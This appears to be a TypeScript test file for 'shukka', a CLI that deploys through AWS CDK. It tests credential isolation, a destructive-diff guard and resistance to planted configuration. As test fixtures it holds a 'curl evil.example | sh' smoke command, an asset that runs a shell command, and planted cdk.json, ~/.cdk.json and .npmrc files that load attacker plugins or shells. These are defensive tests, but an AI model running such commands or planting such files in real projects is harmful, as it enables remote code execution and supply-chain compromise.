 * directory, inside the checkout (all that outlives the container), and print that path.
 */
function bundleInTree(bundle: string, cwd: string) {
  if (!bundle) return { status: 0, stdout: 'building\n' };
  const out = join(cwd, '.next', 'shukka-bundle');
  cpSync(bundle, out, { recursive: true });
  return { status: 0, stdout: `building\n${out}\n` };
}

/** A spawn for a real deploy run: commands succeed, cdk synth writes a manifest, cdk diff prints `diff`, the bundle script bundles `bundle`. */
function deploySpawn(diff: string, bundle: string, diffStatus = 0) {
  return recordingSpawn(({ cmd, args, options }) => {
    if (cmd === 'npx' && args.includes('synth')) {
      const out = args[args.indexOf('--output') + 1]!;
      write(join(out, 'manifest.json'), JSON.stringify({ artifacts: { 'shukkatest-App': { type: 'aws:cloudformation:stack', properties: { tags: { Project: 'shukkatest' } } } } }));
      return { status: 0, stdout: '' };
    }
    if (cmd === process.execPath && args[1] === 'diff') return { status: diffStatus, stdout: diff };
    if (cmd === 'bash' && args[0]?.endsWith('bundle.sh')) return bundleInTree(bundle, options.cwd);
    return { status: 0, stdout: '' };
  });
}

function releaseClients() {
  const s3 = stubClient();
  const ec2 = stubClient(() => ({ Reservations: [{ Instances: [{ InstanceId: 'i-0abc' }] }] }));
  const ssm = ssmStub({ Status: 'Success', ResponseCode: 0, StandardOutputContent: 'shukka: shukkatest/web old -> new live\n' });
  return { s3, ec2, ssm };
}

/** An SSM stub: agents Online (release.mjs waits for them before SendCommand), one command, this invocation result. */
function ssmStub(invocation: Record<string, unknown>) {
  return stubClient((c) => {
    if (c.constructor.name === 'DescribeInstanceInformationCommand') return { InstanceInformationList: [{ InstanceId: 'i-0abc', PingStatus: 'Online' }] };
    if (c.constructor.name === 'SendCommandCommand') return { Command: { CommandId: 'cmd-1' } };
    return invocation;
  });
}

function awsWith(c: ReturnType<typeof releaseClients>, over: Fake = {}) {
  return fakeAws({ clients: () => ({ s3: c.s3.client, ssm: c.ssm.client, ec2: c.ec2.client }), ...over });
}

test('shu-5ix: deploy runs the guard on the cdk diff, deploys with the revision tag, then uploads and releases through the shared modules', withTmp(async (tmp) => {
  const { dir, sha } = consumer(tmp);
  const bundle = bundleDir(tmp);
  const { calls, spawn } = deploySpawn(CLEAN_DIFF, bundle);
  const c = releaseClients();
  const r = await cli(['deploy', '--profile', 'stelking'], { cwd: dir, spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 0, r.out + r.err);

  const build = calls.find((x) => x.cmd === 'bash' && x.args.includes('npm run build'))!;
  assert.equal(build.options.fullEnv.APP_URL, 'https://example.com');
  assert.equal(build.options.fullEnv.LEGAL_ENTITY, 'Example Ltd', 'buildEnv from Parameter Store when not in the environment');

  assert.match(r.out, /guard: nothing is deleted or replaced/);
  const deploy = calls.find((x) => isCdk(x, 'deploy'))!;
  assert.deepEqual(deploy.args.slice(deploy.args.indexOf('--all')), ['--all', '--tags=Project=shukkatest', `--tags=shukka:revision=${sha}`]);

  const puts = c.s3.calls.map((x) => x.input.Key);
  assert.deepEqual(puts, [`shukkatest/web/${sha}.tgz`, `shukkatest/web/${sha}.configure.sh`]);
  assert.equal(c.s3.calls[0]!.input.Bucket, `shukkatest-deploy-${ACCOUNT}`);
  assert.equal(c.s3.calls[1]!.input.Body.toString(), '#!/usr/bin/env bash\necho configured\n', 'the hook comes from git');
  const send = c.ssm.calls.find((x) => x.constructor.name === 'SendCommandCommand')!;
  assert.deepEqual(send.input.InstanceIds, ['i-0abc']);
  const names = c.ssm.calls.map((x) => x.constructor.name);
  assert.ok(names.indexOf('DescribeInstanceInformationCommand') !== -1 && names.indexOf('DescribeInstanceInformationCommand') < names.indexOf('SendCommandCommand'), 'release waits for the SSM agent first');
  assert.ok(calls.some((x) => x.cmd === 'bash' && x.args[1] === 'bash smoke.sh'), 'smoke ran');
}));

test('shu-5ix: deploy reads aws.deployBucket from shukka.json when it is set', withTmp(async (tmp) => {
  // The bucket starts with the project name: shukka.json refuses any other (shu-9bj.9).
  const { dir } = consumer(tmp, (c) => { c.aws.deployBucket = 'shukkatest-custom-bundles'; });
  const r = await cli(['deploy', '--dry-run'], { cwd: dir });
  // Until the workflows task's schema field lands, the schema refuses the key; after it, the bucket is used.
  if (r.code === 0) assert.match(r.out, /s3:\/\/shukkatest-custom-bundles\/shukkatest\/web\//);
  else assert.match(r.err, /aws\.deployBucket: unknown key/);
}));

test('shu-5ix: project code runs without AWS credentials; cdk gets only the deploy-role session; upload and release keep the caller', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const { calls, spawn } = deploySpawn(CLEAN_DIFF, bundleDir(tmp));
  const c = releaseClients();
  const assumed: string[] = [];
  const { aws } = awsWith(c, { assumeRole: async (arn: string) => { assumed.push(arn); return { accessKeyId: 'ASIAFENCED', secretAccessKey: 'fenced-secret', sessionToken: 'fenced-token' }; } });
  const saved = { ...process.env };
  Object.assign(process.env, { AWS_PROFILE: 'stelking', AWS_ACCESS_KEY_ID: 'AKIAADMIN', AWS_SECRET_ACCESS_KEY: 'admin-secret', aws_session_token: 'lower' });
  try {
    const r = await cli(['deploy', '--profile', 'stelking'], { cwd: dir, spawn, aws, checkAssembly: NO_ASSETS, keepTemp: true });
    assert.equal(r.code, 0, r.err);
  } finally {
    for (const k of ['AWS_PROFILE', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'aws_session_token']) if (!(k in saved)) delete process.env[k];
  }
  const code = calls.filter((x) => x.cmd === 'bash' || x.cmd === 'npm' || x.cmd === 'npx');
  assert.ok(code.length >= 6, 'checks, build, bundle, npm ci, synth, smoke');
  for (const x of code) {
    // In a container since shu-9bj.8: fullEnv is the container's whole environment (the recording spawn reads it from
    // the docker command line); without Docker, --trust-project-code keeps the old environment (tested there).
    const env = x.options.fullEnv;
    assert.ok(x.options.docker, `${x.cmd} ${x.args.join(' ')} runs in a container`);
    const aws = Object.keys(env).filter((k) => /^aws_/i.test(k)).sort();
    assert.deepEqual(aws, [], `${x.cmd} ${x.args.join(' ')}`);
    assert.ok(x.options.cwd.includes('shukka-tree-'), `${x.cmd} runs in the fresh tree, not the checkout: ${x.options.cwd}`);
  }
  assert.deepEqual(assumed, [`arn:aws:iam::${ACCOUNT}:role/cdk-shukkatest-deploy-role-${ACCOUNT}-us-east-1`]);
  for (const verb of ['diff', 'deploy']) {
    const x = calls.find((y) => isCdk(y, verb))!;
    const env = x.options.fullEnv;
    assert.equal(env.AWS_ACCESS_KEY_ID, 'ASIAFENCED');
    assert.equal(env.AWS_SECRET_ACCESS_KEY, 'fenced-secret');
    assert.equal(env.AWS_SESSION_TOKEN, 'fenced-token');
    assert.equal(env.AWS_PROFILE, undefined);
    assert.equal(env.aws_session_token, undefined);
    assert.ok(!x.args.includes('--profile'), 'cdk is not given the caller profile');
    assert.equal(env.npm_config_script_shell, '/bin/sh');
    assert.equal(env.npm_config_registry, 'https://registry.npmjs.org/');
    assert.ok(x.options.cwd.includes('shukka-cdk-cwd-'), `cdk runs in an empty shukka temp directory: ${x.options.cwd}`);
    assert.ok(env.HOME.includes('shukka-cdk-home-'), `cdk gets an empty HOME: ${env.HOME}`);
  }
  assert.equal(c.s3.calls.length, 2, 'upload and release used the caller clients');
}));

test('shu-5ix: deploy stops at the guard on a destructive diff unless --allow-replacement, and takes buildEnv from the environment', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const bundle = bundleDir(tmp);
  const env = { LEGAL_ENTITY: 'From Env', CONTACT_EMAIL: 'env@example.com' };
  let s = deploySpawn(DESTRUCTIVE_DIFF, bundle);
  let c = releaseClients();
  let r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, env, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1);
  assert.match(r.out, /\[-\] AWS::EC2::Instance Box/);
  assert.match(r.err, /the guard stopped the deploy.*--allow-replacement/);
  assert.match(r.err, /warning: --skip-checks/);
  assert.ok(!s.calls.some((x) => x.args.includes('npm test')), 'checks skipped');
  assert.ok(!s.calls.some((x) => isCdk(x, 'deploy')), 'no cdk deploy');
  assert.equal(c.s3.calls.length, 0, 'nothing uploaded');
  assert.equal(s.calls.find((x) => x.args.includes('npm run build'))!.options.fullEnv.LEGAL_ENTITY, 'From Env');

  s = deploySpawn(DESTRUCTIVE_DIFF, bundle);
  c = releaseClients();
  r = await cli(['deploy', '--skip-checks', '--allow-replacement'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, env, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 0, r.err);
  assert.match(r.out, /guard: allowed/);
  assert.ok(s.calls.some((x) => isCdk(x, 'deploy')));
  assert.equal(c.s3.calls.length, 2);
}));

test('shu-5ix: deploy refuses an assembly with executable or Docker assets before cdk gets credentials', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const s = deploySpawn(CLEAN_DIFF, bundleDir(tmp));
  const c = releaseClients();
  const assumed: string[] = [];
  const r = await cli(['deploy', '--skip-checks'], {
    cwd: dir, spawn: s.spawn, aws: awsWith(c, { assumeRole: async (a: string) => { assumed.push(a); return {}; } }).aws,
    checkAssembly: () => ['assembly: x.assets.json: file asset a1 is built by running a command (source.executable); refused'],
  });
  assert.equal(r.code, 1);
  assert.match(r.err, /refusing to deploy the synthesized assembly:\nshukka: assembly: x\.assets\.json: file asset a1/);
  assert.deepEqual(assumed, [], 'no session was made');
  assert.ok(!s.calls.some((x) => isCdk(x, 'diff') || isCdk(x, 'deploy')));
  assert.equal(c.s3.calls.length, 0);
}));

test("shu-5ix: without an injected check, deploy uses the workflows' scripts/assembly.mjs, or refuses while it is absent", withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const s = recordingSpawn(({ cmd, args, options }) => {
    if (cmd === 'npx' && args.includes('synth')) {
      const out = args[args.indexOf('--output') + 1]!;
      write(join(out, 'manifest.json'), JSON.stringify({ version: '1', artifacts: { 'shukkatest-App.assets': { type: 'cdk:asset-manifest', properties: { file: 'shukkatest-App.assets.json' } } } }));
      write(join(out, 'shukkatest-App.assets.json'), JSON.stringify({ version: '1', files: { a1: { source: { executable: ['sh', '-c', 'touch /tmp/pwned'] }, destinations: {} } } }));
    }
    if (cmd === 'bash' && args[0]?.endsWith('bundle.sh')) return bundleInTree(bundleDir(tmp), options.cwd);
    return { status: 0, stdout: '' };
  });
  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(releaseClients()).aws });
  assert.equal(r.code, 1);
  if (existsSync(join(root, 'scripts', 'assembly.mjs'))) assert.match(r.err, /source\.executable/);
  else assert.match(r.err, /no scripts\/assembly\.mjs/);
  assert.ok(!s.calls.some((x) => isCdk(x, 'diff') || isCdk(x, 'deploy')));
}));

test('shu-5ix: a failed cdk diff stops the deploy and fails diff', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  let s = deploySpawn('Stack shukkatest-App\n✨  Number of stacks with differences: 0\n', bundleDir(tmp), 3);
  const c = releaseClients();
  let r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: awsWith(c).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1);
  assert.match(r.err, /cdk diff failed \(exit 3\)/);
  assert.ok(!s.calls.some((x) => isCdk(x, 'deploy')));
  assert.equal(c.s3.calls.length, 0);
  s = deploySpawn(CLEAN_DIFF, '', 3);
  r = await cli(['diff'], { cwd: dir, spawn: s.spawn, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1);
  assert.match(r.err, /cdk diff failed \(exit 3\)/);
}));

test('shu-5ix: a failed release exits with the release script code', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const s = deploySpawn(CLEAN_DIFF, bundleDir(tmp));
  const c = releaseClients();
  const ssm = ssmStub({ Status: 'Failed', ResponseCode: 12, StandardOutputContent: 'shukka: shukkatest/web a -> b rolled-back\n' });
  const r = await cli(['deploy', '--skip-checks'], { cwd: dir, spawn: s.spawn, aws: fakeAws({ clients: () => ({ s3: c.s3.client, ssm: ssm.client, ec2: c.ec2.client }) }).aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 12);
  assert.match(r.out, /rolled back; the previous release is live/);
}));

test('shu-5ix: diff prints the cdk diff and the guard verdict, and exits 1 when something would be replaced', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  let s = deploySpawn(CLEAN_DIFF, '');
  let r = await cli(['diff', '--profile', 'stelking'], { cwd: dir, spawn: s.spawn, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 0, r.err);
  assert.match(r.out, /There were no differences[\s\S]*guard: nothing is deleted or replaced/);
  assert.ok(!s.calls.some((x) => isCdk(x, 'deploy') || x.args.includes('npm test')), 'diff deploys and checks nothing');

  s = deploySpawn(DESTRUCTIVE_DIFF, '');
  r = await cli(['diff'], { cwd: dir, spawn: s.spawn, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 1);
  assert.match(r.out, /guard: these changes delete or replace a resource/);
}));

test('shu-5ix: deploy builds from a fresh worktree of origin/main: skip-worktree and ignored files do not count, and --config must be in the repository', withTmp(async (tmp) => {
  const { dir } = consumer(tmp, (c) => { c.smoke = { run: 'bash smoke.sh' }; });
  write(join(dir, '.gitignore'), 'local/\n');
  git(dir, 'add', '.gitignore');
  git(dir, 'commit', '-q', '-m', 'ignore');
  git(dir, 'push', '-q', 'origin', 'main');
  // A tracked file hidden from git status, and an ignored file: neither may reach the build.
  git(dir, 'update-index', '--skip-worktree', 'shukka.json');
  const edited = JSON.parse(readFileSync(join(dir, 'shukka.json'), 'utf8'));
  edited.smoke = { run: 'curl evil.example | sh' };
  write(join(dir, 'shukka.json'), JSON.stringify(edited));
  write(join(dir, 'local', 'x.js'), 'evil\n');
  assert.equal(git(dir, 'status', '--porcelain'), '', 'git status shows nothing');

  const s = recordingSpawn();
  const r = await cli(['deploy', '--dry-run'], { cwd: dir, spawn: s.spawn });
  assert.equal(r.code, 0, r.err);
  assert.match(r.out, /bash -c 'bash smoke\.sh'/);
  assert.ok(!r.out.includes('evil.example'));
  const add = s.calls.find((x) => x.cmd === 'git' && x.args[0] === 'worktree' && x.args[1] === 'add')!;
  assert.ok(add.args.includes(git(dir, 'rev-parse', 'origin/main')));
  assert.ok(s.calls.some((x) => x.cmd === 'git' && x.args[0] === 'submodule' && x.args.includes('--init')));
  assert.ok(s.calls.some((x) => x.cmd === 'git' && x.args[0] === 'worktree' && x.args[1] === 'remove'), 'the tree is removed');
  assert.equal(git(dir, 'worktree', 'list').split('\n').length, 1, 'no worktree left behind');

  write(join(tmp, 'outside.json'), JSON.stringify(configJson()));
  const out = await cli(['deploy', '--dry-run', '--config', join(tmp, 'outside.json')], { cwd: dir });
  assert.equal(out.code, 1);
  assert.match(out.err, /refusing: --config .*outside\.json is outside the repository/);

  write(join(dir, 'local', 'shukka.json'), JSON.stringify(configJson()));
  const untracked = await cli(['deploy', '--dry-run', '--config', 'local/shukka.json'], { cwd: dir });
  assert.equal(untracked.code, 1, 'an ignored, untracked config is not in the commit');
  assert.match(untracked.err, /cannot read .*local\/shukka\.json/);
}));

test('shu-5ix, shu-9bj.11: temporary directories are removed when a command ends, even while another process creates shukka-* entries in the system tmpdir', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  // Another process (a sibling gate, another test file) making shukka-* entries in the shared system tmpdir
  // throughout the commands: the check must not see them.
  const system = tmpdir();
  const noise = spawn(process.execPath, ['-e', `
    const { mkdirSync } = require('node:fs');
    const { join } = require('node:path');
    let i = 0;
    const make = () => mkdirSync(join(${JSON.stringify(system)}, 'shukka-noise-' + process.pid + '-' + i++));
    make();
    process.stdout.write('ready\\n');
    setInterval(make, 5);
  `], { stdio: ['ignore', 'pipe', 'inherit'] });
  const own = join(tmp, 'tmpdir');
  mkdirSync(own);
  const savedTmp = process.env.TMPDIR;
  let noiseMade = 0;
  try {
    await new Promise<void>((resolve, reject) => {
      noise.stdout!.once('data', () => resolve());
      noise.once('exit', (code) => reject(new Error(`noise process exited (${code}) before it started`)));
    });
    // The commands' temp directories go to a tmpdir only they use (os.tmpdir() reads TMPDIR on every call).
    process.env.TMPDIR = own;
    assert.equal(tmpdir(), own);
    const r = await cli(['deploy', '--dry-run'], { cwd: dir, keepTemp: false });
    assert.equal(r.code, 0, r.err);
    const b = await cli(projectArgs(), { cwd: dir, keepTemp: false });
    assert.equal(b.code, 0, b.err);
    assert.deepEqual(readdirSync(own).filter((n) => n.startsWith('shukka-')), []);
  } finally {
    if (savedTmp === undefined) delete process.env.TMPDIR;
    else process.env.TMPDIR = savedTmp;
    const exited = new Promise((resolve) => noise.once('exit', resolve));
    noise.kill();
    if (noise.exitCode === null && noise.signalCode === null) await exited;
    for (const n of readdirSync(system)) {
      if (!n.startsWith(`shukka-noise-${noise.pid}-`)) continue;
      noiseMade++;
      rmSync(join(system, n), { recursive: true, force: true });
    }
  }
  assert.ok(noiseMade > 1, 'the other process kept making shukka-* entries while the commands ran');
}));

// ---------- security: what the cdk child, the fence and the project list may read ----------

test("shu-5ix: a planted .npmrc and cdk.json in the directory bootstrap runs from, and a ~/.cdk.json, are not read by shukka's cdk", withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const marker = join(tmp, 'pwned');
  const homeMarker = join(tmp, 'pwned-home');
  const fakeHome = join(tmp, 'home');
  write(join(fakeHome, 'evil.cjs'), `require('fs').writeFileSync(${JSON.stringify(homeMarker)}, 'plugin ran'); module.exports = { version: '1', init() {} };\n`);
  write(join(fakeHome, '.cdk.json'), JSON.stringify({ plugin: [join(fakeHome, 'evil.cjs')] }));
  const savedHome = process.env.HOME;
  const savedFiles = [process.env.AWS_CONFIG_FILE, process.env.AWS_SHARED_CREDENTIALS_FILE];
  process.env.HOME = fakeHome;
  delete process.env.AWS_CONFIG_FILE;
  delete process.env.AWS_SHARED_CREDENTIALS_FILE;
  try {
  write(join(dir, 'evil.cjs'), `require('fs').writeFileSync(${JSON.stringify(marker)}, 'plugin ran'); module.exports = { version: '1', init() {} };\n`);
  write(join(dir, 'cdk.json'), JSON.stringify({ plugin: [join(dir, 'evil.cjs')] }));
  write(join(dir, 'evil.sh'), `#!/bin/sh\necho shell > ${marker}\n`);
  write(join(dir, '.npmrc'), `script-shell=${join(dir, 'evil.sh')}\nregistry=http://127.0.0.1:9/\n`);
  const replays: { cwd: string; out: string }[] = [];
  // Each cdk deploy is replayed for real as `cdk ls` (no AWS call) with the same binary, directory and environment.
  const { calls, spawn } = recordingSpawn(({ cmd, args, options }) => {
    if (cmd === process.execPath && args[0] === cdkBin()) {
      const app = args[args.indexOf('--app') + 1]!;
      const env = { ...process.env, ...options.env, CDK_DISABLE_CLI_TELEMETRY: 'true' };
      const r = spawnSync(process.execPath, [cdkBin(), 'ls', '--app', app, '--no-notices'], { cwd: options.cwd, env, encoding: 'utf8' });
      replays.push({ cwd: options.cwd, out: r.stdout + r.stderr });
    }
    return { status: 0, stdout: '' };
  });
  const r = await cli(projectArgs().filter((a) => a !== '--dry-run'), { cwd: dir, spawn, keepTemp: true });
  assert.equal(r.code, 0, r.err);
  const cdkCalls = calls.filter((x) => x.cmd === process.execPath);
  assert.ok(cdkCalls.length >= 1);
  for (const x of cdkCalls) {
    assert.ok(x.args[0]!.startsWith(join(root, 'node_modules', 'aws-cdk')), `shukka's own cdk: ${x.args[0]}`);
    assert.notEqual(x.options.cwd, dir);
    assert.equal(x.options.env.npm_config_script_shell, '/bin/sh');
    assert.equal(x.options.env.npm_config_registry, 'https://registry.npmjs.org/');
  }
  assert.ok(replays.length >= 1 && replays.every((p) => p.out.includes('Shukka-Boundary-shukkatest')), JSON.stringify(replays));
  assert.ok(!existsSync(marker), 'the planted plugin did not run');

  assert.ok(!existsSync(homeMarker), 'the ~/.cdk.json plugin did not run');
  for (const x of cdkCalls) {
    assert.deepEqual(readdirSync(x.options.cwd), [], 'cdk runs in an empty directory');
    assert.notEqual(x.options.env.HOME, fakeHome);
    assert.deepEqual(readdirSync(x.options.env.HOME), [], 'cdk gets an empty HOME');
    assert.equal(x.options.env.AWS_CONFIG_FILE, join(fakeHome, '.aws', 'config'), "the admin's profile still resolves");
    assert.equal(x.options.env.AWS_SHARED_CREDENTIALS_FILE, join(fakeHome, '.aws', 'credentials'));
  }

  // Controls: the same cdk run from the project directory, or with the real HOME, does load the planted plugin.
  const app = cdkCalls[0]!.args[cdkCalls[0]!.args.indexOf('--app') + 1]!;
  spawnSync(process.execPath, [cdkBin(), 'ls', '--app', app, '--no-notices'], { cwd: dir, env: { ...process.env, CDK_DISABLE_CLI_TELEMETRY: 'true' }, encoding: 'utf8' });
  assert.ok(existsSync(marker), 'control: from the project directory the plugin would have run');
  spawnSync(process.execPath, [cdkBin(), 'ls', '--app', app, '--no-notices'], { cwd: cdkCalls[0]!.options.cwd, env: { ...process.env, HOME: fakeHome, CDK_DISABLE_CLI_TELEMETRY: 'true' }, encoding: 'utf8' });
  assert.ok(existsSync(homeMarker), 'control: with the real HOME the ~/.cdk.json plugin would have run');
  } finally {
    process.env.HOME = savedHome;
    if (savedFiles[0] !== undefined) process.env.AWS_CONFIG_FILE = savedFiles[0];
    if (savedFiles[1] !== undefined) process.env.AWS_SHARED_CREDENTIALS_FILE = savedFiles[1];
  }
}));

test('shu-5ix: cdk diff and deploy run with the deploy-role session only, so asset publishing goes deploy role to file-publishing role', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const { calls, spawn } = deploySpawn(CLEAN_DIFF, bundleDir(tmp));
  const c = releaseClients();
  const session = { accessKeyId: 'ASIADEPLOYROLE', secretAccessKey: 's', sessionToken: 't' };
  const assumed: string[] = [];
  const { aws } = awsWith(c, { assumeRole: async (arn: string) => { assumed.push(arn); return session; } });
  const r = await cli(['deploy', '--skip-checks', '--profile', 'stelking'], { cwd: dir, spawn, aws, checkAssembly: NO_ASSETS });
  assert.equal(r.code, 0, r.err);
  assert.deepEqual(assumed, [`arn:aws:iam::${ACCOUNT}:role/cdk-shukkatest-deploy-role-${ACCOUNT}-us-east-1`]);
  const cdkCalls = calls.filter((x) => x.cmd === process.execPath && x.args[0] === cdkBin());
  assert.deepEqual(cdkCalls.map((x) => x.args[1]), ['diff', 'deploy']);
  for (const x of cdkCalls) {
    const env = x.options.fullEnv;
    assert.equal(env.AWS_ACCESS_KEY_ID, session.accessKeyId);
    assert.equal(env.AWS_SESSION_TOKEN, session.sessionToken);
    assert.equal(readFileSync(env.AWS_CONFIG_FILE, 'utf8'), '', 'no profile to fall back on: cdk publishes assets from this session');
    assert.equal(readFileSync(env.AWS_SHARED_CREDENTIALS_FILE, 'utf8'), '');
    assert.ok(!x.args.includes('--profile'));
  }
}));

test('shu-5ix: a shukka.json that is a symbolic link is refused', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  write(join(tmp, 'elsewhere.json'), readFileSync(join(dir, 'shukka.json'), 'utf8'));
  rmSync(join(dir, 'shukka.json'));
  symlinkSync(join(tmp, 'elsewhere.json'), join(dir, 'shukka.json'));
  git(dir, 'add', '-A');
  git(dir, 'commit', '-q', '-m', 'link');
  git(dir, 'push', '-q', 'origin', 'main');
  for (const argv of [['deploy', '--dry-run'], ['diff'], projectArgs()]) {
    const { calls, spawn } = recordingSpawn();
    const r = await cli(argv, { cwd: dir, spawn });
    assert.equal(r.code, 1, `${argv[0]}: ${r.out}${r.err}`);
    assert.match(r.err, /refusing: \S*shukka\.json is or is under a symbolic link/, argv[0]);
    assert.deepEqual(MUTATING(calls), [], `${argv[0]}: nothing ran`);
  }
}));

test('shu-5ix: the fence prints each hosted zone with its name and each mail domain with where it came from, also in a dry run', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const r = await cli(projectArgs(), { cwd: dir });
  assert.equal(r.code, 0, r.err);
  assert.match(r.out, new RegExp(`1/4 Shukka-Boundary-shukkatest: .*fence: hosted zone ${ZONE} \\(example\\.com\\.\\) from \\S*shukka\\.json; mail domains example\\.com from \\S*shukka\\.json`));
  const f = await cli(projectArgs(['--hosted-zone-id', 'ZFLAG1', '--mail-domain', 'b.example.org']), { cwd: dir });
  assert.equal(f.code, 0, f.err);
  assert.match(f.out, /fence: hosted zone ZFLAG1 \(zone-zflag1\.example\.\) from --hosted-zone-id; mail domains b\.example\.org from --mail-domain/);
}));

test("shu-5ix: a hosted zone or mail domain another project's fence holds is refused; known projects come from IAM and an unreadable list is refused", withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const policies = [
    { name: 'other-shukka-boundary', arn: `arn:aws:iam::${ACCOUNT}:policy/other-shukka-boundary`, defaultVersionId: 'v1' },
    { name: 'other-shukka-execution', arn: `arn:aws:iam::${ACCOUNT}:policy/other-shukka-execution`, defaultVersionId: 'v3' },
  ];
  const docs = (zone: string, domain: string) => async (p: any) => (p.name === 'other-shukka-execution'
    ? JSON.stringify({ Statement: [{ Resource: `arn:aws:route53:::hostedzone/${zone}` }, { Resource: [`arn:aws:ses:us-east-1:${ACCOUNT}:identity/${domain}`] }] })
    : '{}');
  const run = async (over: Fake) => {
    const { calls, spawn } = recordingSpawn();
    const r = await cli(projectArgs().filter((a) => a !== '--dry-run'), { cwd: dir, spawn, aws: fakeAws(over).aws });
    assert.deepEqual(MUTATING(calls), [], 'nothing ran');
    return r;
  };
  let r = await run({ localPolicies: async () => policies, policyDocument: docs(ZONE, 'other.example') });
  assert.equal(r.code, 1);
  assert.match(r.err, new RegExp(`hosted zone ${ZONE} \\(example\\.com\\.\\) is already in project other's fence`));
  r = await run({ localPolicies: async () => policies, policyDocument: docs('ZOTHER', 'Example.com') });
  assert.equal(r.code, 1);
  assert.match(r.err, /mail domain example\.com is already in project other's fence/);
  r = await run({ localPolicies: async () => [{ name: 'shukkatestx-shukka-boundary', arn: 'a', defaultVersionId: 'v1' }] });
  assert.equal(r.code, 1);
  assert.match(r.err, /"shukkatest" is a prefix of known project "shukkatestx"/);
  r = await run({ localPolicies: async () => { throw new Error('AccessDenied'); } });
  assert.equal(r.code, 1);
  assert.match(r.err, /cannot list the account's IAM policies .*AccessDenied/);
}));

test('shu-5ix: a bad --emergency-principal is refused before any lookup', withTmp(async (tmp) => {
  const { dir } = consumer(tmp);
  const fake = fakeAws();
  const r = await cli(projectArgs(['--emergency-principal', 'arn:aws:iam::123456789012:role/*']).filter((a) => a !== '--dry-run'), { cwd: dir, aws: fake.aws });
  assert.equal(r.code, 1);
  assert.match(r.err, /emergency principal "arn:aws:iam::123456789012:role\/\*" must be an IAM role or user ARN/);
  assert.deepEqual(fake.reads, [], 'no AWS read was made');
}));

test('shu-5ix: the CLI ships an npm-shrinkwrap.json pinning its runtime tree, and aws-cdk-lib is pinned to the tested version', () => {
  const pkg = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
  const wrap = JSON.parse(readFileSync(join(root, 'npm-shrinkwrap.json'), 'utf8'));
  assert.ok(!existsSync(join(root, 'package-lock.json')), 'one lockfile: npm-shrinkwrap.json');
  assert.equal(pkg.dependencies['aws-cdk'], '2.1148.0');
  assert.match(pkg.devDependencies['aws-cdk-lib'], /^\d+\.\d+\.\d+$/);
  for (const [name, range] of Object.entries(pkg.dependencies as Record<string, string>)) {
    const locked = wrap.packages[`node_modules/${name}`];
    assert.ok(locked && !locked.dev, `${name} is in the shrinkwrap as a runtime dependency`);
    if (/^\d+\.\d+\.\d+$/.test(range)) assert.equal(locked.version, range);
  }
  assert.equal(wrap.packages['node_modules/aws-cdk-lib'].version, pkg.devDependencies['aws-cdk-lib']);
});

test("shu-5ix: bin/shukka compiles with shukka's own tsconfig, not one in the directory it runs from", withTmp((tmp) => {
  write(join(tmp, 'tsconfig.json'), '{ "compilerOptions": { "jsx": "react", "paths": { "./exec.mjs": ["./evil.mjs"] } }, broken');
  const r = spawnSync(process.execPath, [join(root, 'bin', 'shukka'), '--help'], { cwd: tmp, encoding: 'utf8', env: { ...process.env, TSX_TSCONFIG_PATH: join(tmp, 'tsconfig.json') } });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.stdout, helpText());
  assert.match(readFileSync(join(root, 'bin', 'shukka'), 'utf8'), /process\.env\.TSX_TSCONFIG_PATH = tsconfig;\nregister\(\{ tsconfig \}\);/);
}));

// ---------- --help ----------

test('shu-5ix: --help documents every command and every option', async () => {
  const text = helpText();
  for (const c of COMMANDS) {
    assert.match(text, new RegExp(`^${c.name}$`, 'm'), `section for ${c.name}`);
    for (const f of c.flags) assert.ok(text.includes(`--${f.name}`), `--${f.name} of ${c.name}`);
  }
  for (const phrase of ['bootstrap --account', 'bootstrap <project>', 'diff', 'deploy', 'origin/main', '--dry-run']) assert.ok(text.includes(phrase), phrase);

  for (const argv of [['--help'], ['help'], ['deploy', '--help'], ['bootstrap', '-h']]) {
    const r = await cli(argv);
    assert.equal(r.code, 0);
    assert.equal(r.out, text);
  }
  const unknown = await cli(['deploy', '--force']);
  assert.equal(unknown.code, 2);
  assert.match(unknown.err, /unknown option --force/);
  const nothing = await cli([]);
  assert.equal(nothing.code, 2);
});

test('shu-5ix: bin/shukka --help runs as the npx entry point', () => {
  const r = spawnSync(process.execPath, [join(root, 'bin', 'shukka'), '--help'], { encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.equal(r.stdout, helpText());
  const pkg = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8'));
  assert.equal(pkg.bin.shukka, 'bin/shukka');
  assert.ok(pkg.dependencies.tsx, 'tsx is a runtime dependency: npx installs no devDependencies');
});

// ---------- shu-9bj.5: a stack selector or tag from the assembly never becomes a cdk option ----------

const PLUGIN_FIXTURE = join(root, 'test', 'fixtures', 'assembly', 'plugin-selector');

/** Write the security review's hostile assembly to `out`, its manifest changed by `mutate`. */
